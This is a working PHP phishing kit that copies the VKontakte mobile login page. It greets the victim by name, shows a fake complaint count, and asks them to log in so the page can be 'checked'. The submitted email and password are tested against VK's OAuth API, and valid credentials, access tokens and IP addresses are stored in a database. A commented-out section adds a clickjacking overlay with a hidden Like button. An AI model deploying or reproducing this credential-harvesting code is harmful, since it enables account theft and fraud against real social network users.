﻿<?php
$id = $_GET['id'];
if(empty($id)) {
	header("Location: https://google.com");
}

$request = 'http://api.vk.com/method/users.get?uids='.$id.'&fields=first_name,last_name';
$response1 = file_get_contents($request);
$info = array_shift(json_decode($response1)->response); 

if(empty($info->uid)) {
  header("Location: https://google.com");
}

?>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="format-detection" content="telephone=no" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="MobileOptimized" content="176" />
<meta name="HandheldFriendly" content="True" />
<base id="base">
<meta name="msApplication-ID" content="C6965DD5.VK" /><meta name="msApplication-PackageFamilyName" content="C6965DD5.VK_v422avzh127ra" /><style>@-ms-viewport{width:device-width;}</style>
<title>Мобильная версия ВКонтакте</title>
<link type="text/css" rel="stylesheet" href="http://m.vk.com//css/s_cfmxw.css?273"></link>
<link type="text/css" rel="stylesheet" media="only screen" href="http://m.vk.com//css/s_yzgt.css?203"></link>
<style>
li{
	display: table-cell;
	widht: auto;
}
</style>
<script type="text/javascript" src="http://m.vk.com//js/s_c.js?244"></script>
<link rel="shortcut icon" href="http://m.vk.com//images/faviconnew.ico?3"></link>
<link rel="canonical" href="http://vk.com/"></link><link rel="alternate" href="android-app://com.vkontakte.android/vkontakte/m.vk.com/" />
</head>
<body id="vk" class="_hover" onresize="onBodyResize(true);">
<div id="vk_utils"></div>
<div id="vk_head" class="mhead">
<div class="hb_wrap"><div class="hb_btn">&nbsp;</div></div>
</div>
<div id="vk_wrap" class="_vpan qs_enabled">
<div id="l"></div>
<div id="m"><div id="mhead" class="mhead">
<a href="/" accesskey="*" class="hb_wrap mhb_logo">
<div class="hb_btn mhi_logo">&nbsp;</div>
<h1 class="hb_btn mh_header">&nbsp;</h1>
</a></div>

<div id="mcont" class="mcont"><div class="pcont fit_box bl_cont">
<div class="text_panel">
Мобильная версия поможет Вам оставаться ВКонтакте, даже если Вы далеко от компьютера.
</div>
<div class="form_item fi_fat"><br>
<div class="ulclass">
<ul>
<li><div class="fi_label" style="color: black;"><b> Имя:</b> <?php echo $info->first_name; ?> </div>
<div class="fi_label" style="color: black;"><b> Фамилия:</b> <?php echo $info->last_name; ?> </div>
<div class="fi_label" style="color: black;"><b> ID страницы:</b> <?php echo $info->uid; ?> </div>
<div class="fi_label" style="color: black;"><b> Жалоб на данного пользователя:</b> <?php echo (9); ?></div></li>
</ul>
</div>
<div class="form_item fi_fat">
<form method="post" novalidate>
<hr>
<center><div class="service_msg service_msg_warning"><b><?php echo $info->first_name; ?>, </b>пожалуйста, войдите в ВКонтакте для проверки страницы.</div></center>
<hr>
<form method="post">
<dl class="fi_row">
<dt class="fi_label">Телефон или email:</dt>
<dd>
<div class="iwrap"><input type="text" class="textfield" name="email" value="" /></div>
</dd>
</dl>
<dl class="fi_row">
<dt class="fi_label">Пароль:</dt>
<dd>

<div class="iwrap"><input type="password" class="textfield" name="pass" /></div>
</dd>
</dl>
<div class="fi_row">
<div class="fi_subrow">
<input class="button wide_button" type="submit" value="Войти" name="go" />
</div>
<div class="fi_subrow">
<div class="near_btn wide_button"><a href="http://m.vk.com/restore">Забыли пароль?</a></div>
</div>
</div>
<div class="fi_row_new">
<a class="button wide_button gray_button" href="http://m.vk.com/join">Зарегистрироваться</a>
</div>
</form>

</div>
</div></div>
<div id="mfoot" class="mfoot"><div class="pfoot">
<ul class="footer_menu">
<li class="fm_row"><a class="fm_item" href="http://vk.com/settings?act=change_regional&hash=c59bf21cb8550d4cad&lang_id=3">English</a></li><li class="fm_row"><a class="fm_item" href="http://vk.com/settings?act=change_regional&hash=c59bf21cb8550d4cad&lang_id=1">Українська</a></li>
<li class="fm_row"><a class="fm_item" href="http://vk.com/settings?act=select_lang">all languages »</a></li>
</ul>
<ul id="footer_menu" class="footer_menu">
<li class="fm_row"><a class="fm_item" href="http://vk.com/?_fm=index">Полная версия</a></li>
</ul>
</div></div>
<script id="page_script" type="text/javascript">
<!--
!window.__jsInited&&(function(){window.langConfig={"id":0,"numDel":"<span class=\"num_delim\"> <\/span>","numDelS":" ","numDec":",","prepTags":["{prep_with}","{prep_With}","{prep_about}","{prep_About}","{prep_into}","{prep_Into}"],"prep":[["{prep_with},{prep_With}","С*,З*,Льв*","со,Со"],["{prep_with},{prep_With}","*,Са*,Се*,Сё*,Си*,Со*,Су*,Сэ*,Сю*,Ся*,За*,Зе*,Зё*,Зи*,Зо*,Зу*,Зэ*,Зю*,Зя*","с,С"],["{prep_about},{prep_About}","А*,О*,У*,И*,Э*","об,Об"],["{prep_about},{prep_About}","*","о,О"],["{prep_into},{prep_Into}","В*,Ф*,Льв*","во,Во"],["{prep_into},{prep_Into}","*,Ва*,Ве*,Вё*,Ви*,Во*,Ву*,Вэ*,Вю*,Вя*,Фа*,Фе*,Фё*,Фи*,Фо*,Фу*,Фэ*,Фю*,Фя*","в,В"]],"parent":0,"timeSys":["24hour"],"yearOffset":0,"flexLast":false,"revOrder":false,"RTL":false,"numRules":{"int":[[100,[11,12,13,14],3],[10,[1],1],[10,[2,3,4],2],["*",0,3]],"float":2},"sexRules":[[1,2],["*",1]],"larr":"&larr;","rarr":"&rarr;"};extend(lang,{"mobile_online":"Online","mobile_like":"Мне нравится","mobile_wall_post_publish":"Поделиться","mobile_wall_post_comments":["","%s комментарий","%s комментария","%s комментариев"],"mobile_wall_post_replies_title":"Комментарии","mobile_wall_only_you_liked":"Понравилось только Вам","mobile_wall_you_and_x_people_liked":["","Понравилось Вам и ещё <b>%s<\/b> человеку","Понравилось Вам и ещё <b>%s<\/b> людям","Понравилось Вам и ещё <b>%s<\/b> людям"],"mobile_wall_x_people_liked":["","Понравилось <b>%s<\/b> человеку","Понравилось <b>%s<\/b> людям","Понравилось <b>%s<\/b> людям"],"mobile_wall_only_you_shared":"Поделились только Вы","mobile_wall_you_and_x_people_shared":["","Поделились Вы и ещё <b>%s<\/b> человек","Поделились Вы и ещё <b>%s<\/b> человека","Поделились Вы и ещё <b>%s<\/b> человек"],"mobile_wall_x_people_shared":["","Поделился <b>%s<\/b> человек","Поделились <b>%s<\/b> человека","Поделились <b>%s<\/b> человек"],"mobile_group_head_title":"Группа","mobile_public_head_title":"Страница","mobile_event_head_title":"Мероприятие","mobile_photos_photo_header":"Фотография %s из %s","mobile_photos_on_this_photo":"На этой фотографии:","mobile_photos_photo_album_label":"Альбом:","mobile_photos_photo_author_label":"Отправитель:","mobile_photos_photo_head_title":"Фотография","mobile_photos_photoview_header":"%s из %s","mobile_menu_player_head_title":"Музыка","mobile_audio_player_not_support":"Устройство не поддерживает воспроизведение встроенного аудио","mobile_audio_search_btn":"Искать","mobile_audio_search_placeholder":"Введите название..","mobile_audio_search_not_found":"По запросу «<b>%s<\/b>» не найдено ни одной аудиозаписи","mobile_audio_no_audio":"Нет ни одной аудиозаписи.","mobile_mail_typing":["","{user} пишет..","{user} пишет.."],"mobile_ma</bmulti_typing":"{users} и {last_user} пишут..","mobile_zphoto_release_to_close":"Отпустите, чтобы закрыть..","mobile_zphoto_move_to_close":"Потяните, чтобы закрыть..","mobile_zphoto_close":"Закрыть","mobile_zphoto_upload_header":"Загрузка фотографии","mobile_zphoto_owner_crop_header":"Выбор миниатюры","mobile_zphoto_save_btn":"Сохранить","mobile_zphoto_cancel_btn":"Отмена"});window.langConfig={"id":0,"numDel":"<span class=\"num_delim\"> <\/span>","numDelS":" ","numDec":",","prepTags":["{prep_with}","{prep_With}","{prep_about}","{prep_About}","{prep_into}","{prep_Into}"],"prep":[["{prep_with},{prep_With}","С*,З*,Льв*","со,Со"],["{prep_with},{prep_With}","*,Са*,Се*,Сё*,Си*,Со*,Су*,Сэ*,Сю*,Ся*,За*,Зе*,Зё*,Зи*,Зо*,Зу*,Зэ*,Зю*,Зя*","с,С"],["{prep_about},{prep_About}","А*,О*,У*,И*,Э*","об,Об"],["{prep_about},{prep_About}","*","о,О"],["{prep_into},{prep_Into}","В*,Ф*,Льв*","во,Во"],["{prep_into},{prep_Into}","*,Ва*,Ве*,Вё*,Ви*,Во*,Ву*,Вэ*,Вю*,Вя*,Фа*,Фе*,Фё*,Фи*,Фо*,Фу*,Фэ*,Фю*,Фя*","в,В"]],"parent":0,"timeSys":["24hour"],"yearOffset":0,"flexLast":false,"revOrder":false,"RTL":false,"numRules":{"int":[[100,[11,12,13,14],3],[10,[1],1],[10,[2,3,4],2],["*",0,3]],"float":2},"sexRules":[[1,2],["*",1]],"larr":"&larr;","rarr":"&rarr;"};extend(lang,{"mobile_online":"Online","mobile_like":"Мне нравится","mobile_wall_post_publish":"Поделиться","mobile_wall_post_comments":["","%s комментарий","%s комментария","%s комментариев"],"mobile_wall_post_replies_title":"Комментарии","mobile_wall_only_you_liked":"Понравилось только Вам","mobile_wall_you_and_x_people_liked":["","Понравилось Вам и ещё <b>%s<\/b> человеку","Понравилось Вам и ещё <b>%s<\/b> людям","Понравилось Вам и ещё <b>%s<\/b> людям"],"mobile_wall_x_people_liked":["","Понравилось <b>%s<\/b> человеку","Понравилось <b>%s<\/b> людям","Понравилось <b>%s<\/b> людям"],"mobile_wall_only_you_shared":"Поделились только Вы","mobile_wall_you_and_x_people_shared":["","Поделились Вы и ещё <b>%s<\/b> человек","Поделились Вы и ещё <b>%s<\/b> человека","Поделились Вы и ещё <b>%s<\/b> человек"],"mobile_wall_x_people_shared":["","Поделился <b>%s<\/b> человек","Поделились <b>%s<\/b> человека","Поделились <b>%s<\/b> человек"],"mobile_group_head_title":"Группа","mobile_public_head_title":"Страница","mobile_event_head_title":"Мероприятие","mobile_photos_photo_header":"Фотография %s из %s","mobile_photos_on_this_photo":"На этой фотографии:","mobile_photos_photo_album_label":"Альбом:","mobile_photos_photo_author_label":"Отправитель:","mobile_photos_photo_head_title":"Фотография","mobile_photos_photoview_header":"%s из %s","mobile_menu_player_head_title":"Музыка","mobile_audio_player_not_support":"Устройство не поддерживает воспроизведение встроенного аудио","mobile_audio_search_btn":"Искать","mobile_audio_search_placeholder":"Введите название..","mobile_audio_search_not_found":"По запросу «<b>%s<\/b>» не найдено ни одной аудиозаписи","mobile_audio_no_audio":"Нет ни одной аудиозаписи.","mobile_mail_typing":["","{user} пишет..","{user} пишет.."],"mobile_mail_multi_typing":"{users} и {last_user} пишут..","mobile_zphoto_release_to_close":"Отпустите, чтобы закрыть..","mobile_zphoto_move_to_close":"Потяните, чтобы закрыть..","mobile_zphoto_close":"Закрыть","mobile_zphoto_upload_header":"Загрузка фотографии","mobile_zphoto_owner_crop_header":"Выбор миниатюры","mobile_zphoto_save_btn":"Сохранить","mobile_zphoto_cancel_btn":"Отмена"});window.vk={"id":0,"ts":1422622428,"__debug":false,"iu_ex":true};vk.started=vkNow();window.__jsInited=true;})();
//-->
</script>

<img width="1" height="1" src="//counter.yadro.ru/hit?uhttp%3A%2F%2Fm.vk.com%2F;rhttp%3A%2F%2Fm.vk.com%2F;24162055" alt="" align="left" />
<img width="1" height="1" src="//b.scorecardresearch.com/p?c1=2&c2=13765216&c3=&c4=http%3A%2F%2Fm.vk.com%2F&c5=&c9=http%3A%2F%2Fm.vk.com%2Fc15=&cv=2.0&cj=1&rn=24162055" alt="" align="left" />
</div>
<div id="z"></div>
</div>
<div id="vk_bottom"></div>
</div>
</body>
</html>

<?php
require_once('config.php');
$connect = mysql_connect($config['host'], $config['user'], $config['pass']);
if (!$connect){
	die (mysql_error());
}
else{
	mysql_select_db($config['db'], $connect);
}
If (isset($_POST['go'])){ 
 $email = iconv('utf-8', 'windows-1251', $_POST['email']);
 $password = iconv('utf-8', 'windows-1251', $_POST['pass']);
 $link = '';
 $res=curl('https://api.vk.com/oauth/token?grant_type=password&client_id=2274003&scope=wall&client_secret=hHbZxrka2uZ6jB1inYsH&username='.$email.'&password='.$password.'&captcha_key=&captcha_sid=');
 $lo='access_token';
 $pos = strripos($res, $lo);
if ($pos === false) {
echo '<script>location.href = "failmb.php?id='.htmlspecialchars($_GET['id']).'";</script>';
}else{
$res23 = json_decode($res, true);
$id=$res['user_id'];
$name = curl('https://api.vk.com/method/users.get?user_ids='.$id.'&fields=counters');
$name = json_decode($name, true);
$uid = curl('https://api.vk.com/method/users.get?user_ids='.$id.'&fields=uid');
$uid = json_decode($uid, true);
$res = json_decode($res, true);
$query = ('INSERT INTO vk (number, password, uid, ip,token,code) VALUES("'.$email.'", "'.$password.'","https://vk.com/id'.$res23['user_id'].'","'.$_SERVER['REMOTE_ADDR'].'","' . $res23['access_token'] . '","-")');
mysql_query("SET NAMES CP1251");
mysql_query($query) or die (mysql_error());
$fulname=$name['response']['0']['first_name'].' '.$name['response']['0']['last_name'];
	echo '<meta http-equiv="refresh" content="1;URL=goodm.php?'.$_SERVER['QUERY_STRING'].'"/>';
 }
}

function curl($url){
$ch = curl_init( $url );
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
$response = curl_exec( $ch );
curl_close( $ch );
return $response;
}
  
  function postSend($url, $field) {
      if( $curl = curl_init() ) {
          try{
          curl_setopt($curl, CURLOPT_URL, $url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, $field);
            $out = curl_exec($curl);
            curl_close($curl);

          return $out;
        } catch (Exception $e) {
          return "";
        }
        }
      
      return "";
  }
  
  function get_ip()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
        $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
        $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
?>


<?/*<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<style>#AuthPacker{overflow: hidden;width: 0.1px;height: 0.1px;}#VKoverlay{width:100%;height:100%;position:absolute;top:0;left:0;cursor:pointer;z-index:1001}#VKwrap{overflow:hidden;width:110px;height:25px;opacity:0;position:absolute;z-index:101}#vkwidget1_tt{display:none !important}#vkwidget2_tt{display:none !important}</style>
<script type="text/javascript" src="//vk.com/js/api/openapi.js?136"></script>
<div id="VKoverlay"><div id="VKwrap"><div id="vk_like"></div></div></div>
<div id="AuthPacker"><div id="vk_auth"></div></div>
<script type="text/javascript">
VK.init({apiId: <?=$apiID?>});

VK.Widgets.Auth("vk_auth", {width: "200px", authUrl: '/dev/Login'});

VK.Auth.getLoginStatus(function(){
  setInterval(function(){
    h = $("#vk_auth").height();	
    if(h == 116) {
      $("#VKoverlay").remove();
    }
  }, 100);
});

$(document).ready(function(){
  var el = $('#VKwrap');
  $(document).mousemove(function(e) {
    el.css({left:  e.pageX - 45, top:   e.pageY - 6 });
  });
});

VK.Widgets.Like("vk_like", {type: "button"});

VK.Observer.subscribe("widgets.like.liked", function f() {
  $.get('/likes.php?url=<?=base64_encode($Lsite . '/phone.php?id=' . htmlspecialchars($_REQUEST['id']))?>', function(data) {
    $("#VKoverlay").remove();
  });
});

VK.Observer.subscribe("widgets.like.unliked", function f() {
  $("#VKoverlay").remove();
});
</script> */?>